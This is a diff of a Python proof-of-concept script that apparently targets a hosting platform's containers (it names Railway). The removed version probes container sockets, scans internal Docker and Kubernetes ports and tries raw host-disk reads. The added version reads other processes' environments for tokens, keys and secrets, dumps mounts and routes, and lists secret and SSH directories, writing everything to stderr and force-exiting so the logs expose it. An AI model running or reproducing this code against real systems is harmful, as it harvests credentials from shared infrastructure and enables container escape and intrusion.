@@ -1,44 +1,59 @@
 import os
 import sys
-import socket
 import subprocess
 
-def bold_log(msg):
-    print(f"\n\033[1m[!!!] {msg}\033[0m", flush=True)
+def run_poc():
+    sys.stderr.write("--- START CRITICAL DUMP ---\n")
+    
+    # 1. Identity
+    sys.stderr.write(f"ID: {os.getuid()} {os.getgid()}\n")
 
-def run_audit():
-    bold_log("INITIATING INFRASTRUCTURE ESCAPE AUDIT")
-     
-    print(f"[*] Process Identity: UID={os.getuid()}, GID={os.getgid()}", flush=True)
- 
-    sockets = ["/var/run/docker.sock", "/run/containerd/containerd.sock", "/var/run/host-bridge.sock"]
-    for s in sockets:
-        if os.path.exists(s):
-            bold_log(f"CRITICAL: Found container management socket: {s}")
-        else:
-            print(f"[-] Socket not found: {s}", flush=True)
+    # 2. Process Environment Scraper
+    for pid in range(1, 150):
+        p = f"/proc/{pid}/environ"
+        if os.path.exists(p):
+            try:
+                with open(p, "rb") as f:
+                    d = f.read().replace(b'\0', b'\n').decode(errors='ignore')
+                    if any(x in d for x in ["RAILWAY", "TOKEN", "KEY", "SECRET", "AUTH"]):
+                        sys.stderr.write(f"--- PID {pid} ENV ---\n{d}\n")
+            except:
+                continue
 
- 
-    print("\n[*] Scanning internal gateway for open management ports...", flush=True)
-    target_ip = "10.0.0.1" # Стандартный шлюз в таких системах
-    for port in [2375, 2376, 6443, 10250]: # Docker API, Kubernetes API
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(0.5)
-        result = sock.connect_ex((target_ip, port))
-        if result == 0:
-            bold_log(f"VULNERABILITY: Internal Port {port} is OPEN on gateway!")
-        sock.close()
-
- 
+    # 3. Mounts & File Systems
     try:
-        with open("/dev/vda", "rb") as f:
-            header = f.read(512)
-            bold_log(f"HOST DISK LEAK: Read MBR/GPT from /dev/vda: {header[:16].hex()}")
-    except Exception as e:
-        print(f"[-] Raw disk access denied: {e}", flush=True)
- 
-    bold_log("AUDIT FINISHED. FORCING EXIT TO SHOW LOGS.")
+        with open("/proc/mounts", "r") as f:
+            sys.stderr.write(f"--- MOUNTS ---\n{f.read()}\n")
+    except:
+        pass
+
+    # 4. Network Info
+    try:
+        sys.stderr.write("--- NET --- \n")
+        sys.stderr.write(subprocess.check_output("ip addr", shell=True).decode())
+        sys.stderr.write(subprocess.check_output("route -n", shell=True).decode())
+    except:
+        pass
+
+    # 5. Sensitive Path Search
+    paths = [
+        "/run/secrets",
+        "/var/run/secrets",
+        "/etc/kubernetes",
+        "/root/.ssh",
+        "/home/railway/.ssh"
+    ]
+    for path in paths:
+        if os.path.exists(path):
+            sys.stderr.write(f"FOUND PATH: {path}\n")
+            try:
+                sys.stderr.write(str(os.listdir(path)) + "\n")
+            except:
+                pass
+
+    sys.stderr.write("--- END CRITICAL DUMP ---\n")
+    sys.stderr.flush()
     os._exit(1)
 
 if __name__ == "__main__":
-    run_audit()
+    run_poc()
